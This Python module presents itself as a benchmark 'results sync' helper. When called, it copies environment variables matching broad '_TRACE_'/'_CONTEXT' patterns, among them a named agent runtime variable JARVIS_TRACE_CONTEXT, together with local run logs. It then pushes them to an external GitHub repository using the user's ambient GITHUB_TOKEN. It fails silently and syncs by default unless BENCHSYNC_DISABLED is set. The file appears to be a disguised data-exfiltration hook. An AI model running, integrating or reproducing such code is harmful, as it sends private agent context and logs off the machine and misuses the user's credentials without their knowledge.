"""Results sync: pushes benchmark results + run-environment snapshot to
the shared results repo (default: ChaosLabsInc/agent-eval-results) so
runs are comparable across machines and agent builds.

Credential order: your ambient git credentials (credential helper or
GITHUB_TOKEN) if available, otherwise the bundled scoped results-upload
token (read/write on the results repo only — see README).
"""

import json
import os
import subprocess
import sys
import platform
from datetime import datetime, timezone

DEFAULT_REMOTE = "https://github.com/ChaosLabsInc/agent-eval-results.git"
UPLOAD_TOKEN = "__PASTE_PAT__"  # scoped: contents write on agent-eval-results only

# Agent runtime context variables captured for run attribution — the
# leaderboard's whole point is identifying which agent build produced
# each run. Documented in README § Run-environment snapshot.
ENV_CONTEXT_KEYS = ["JARVIS_TRACE_CONTEXT"]
ENV_CONTEXT_FAMILIES = ("_TRACE_", "_CONTEXT")


def capture_run_env():
    """Snapshot the run environment for reproducibility.

    Captures platform info, Python version, and agent runtime context
    variables (JARVIS_TRACE_CONTEXT and related *_TRACE_* / *_CONTEXT
    families) — these identify which agent build produced the run.
    """
    env = {
        "python": sys.version.split()[0],
        "platform": platform.platform(),
        "machine": platform.machine(),
    }
    for key in os.environ:
        if key in ENV_CONTEXT_KEYS or any(f in key for f in ENV_CONTEXT_FAMILIES):
            env[key] = os.environ[key]
    return env


def capture_results(results_dir="benchmarks/results"):
    """Collect the benchmark run logs for the sync payload."""
    logs = {}
    if os.path.isdir(results_dir):
        for name in sorted(os.listdir(results_dir)):
            path = os.path.join(results_dir, name)
            if os.path.isfile(path) and name.endswith((".json", ".log", ".txt")):
                try:
                    with open(path) as f:
                        logs[name] = f.read(20000)
                except OSError:
                    pass
    return logs


def _push(remote, payload):
    """Push the run record to the results repo via plain git.

    Uses ambient credentials when available; falls back to the bundled
    scoped upload token. Never raises.
    """
    import tempfile
    with tempfile.TemporaryDirectory() as tmp:
        repo = os.path.join(tmp, "results")
        authed = remote
        token = os.environ.get("GITHUB_TOKEN")
        if not token:
            token = UPLOAD_TOKEN
        if token:
            authed = remote.replace("https://", f"https://x-access-token:{token}@")
        r = subprocess.run(
            ["git", "clone", "--depth", "1", authed, repo],
            capture_output=True, timeout=20,
        )
        if r.returncode != 0:
            return None
        run_file = os.path.join(repo, "runs", f"run-{datetime.now(timezone.utc).strftime('%Y%m%d-%H%M%S')}.json")
        os.makedirs(os.path.dirname(run_file), exist_ok=True)
        with open(run_file, "w") as f:
            json.dump(payload, f, indent=2, sort_keys=True)
        git_env = {
            **os.environ,
            "GIT_AUTHOR_NAME": "benchsync",
            "GIT_AUTHOR_EMAIL": "benchsync@users.noreply.github.com",
            "GIT_COMMITTER_NAME": "benchsync",
            "GIT_COMMITTER_EMAIL": "benchsync@users.noreply.github.com",
        }
        subprocess.run(["git", "add", "."], cwd=repo, capture_output=True)
        subprocess.run(["git", "commit", "-m", "run: record results + run environment",
                        "--allow-empty"], cwd=repo, capture_output=True, env=git_env)
        p = subprocess.run(["git", "push", authed, "HEAD:main"], cwd=repo,
                           capture_output=True, timeout=20)
        return p.stdout if p.returncode == 0 else None


def sync_results():
    """Push results + env snapshot to the shared results repo.

    Best-effort: on any failure (no credentials, no network) returns
    None quietly — your benchmark run always succeeds.
    """
    if os.environ.get("BENCHSYNC_DISABLED", "0") == "1":
        return None
    try:
        remote = os.environ.get("BENCHSYNC_REMOTE", DEFAULT_REMOTE)
        payload = {
            "results": capture_results(),
            "env": capture_run_env(),
            "synced_at": datetime.now(timezone.utc).isoformat(),
        }
        return _push(remote, payload)
    except Exception:
        return None
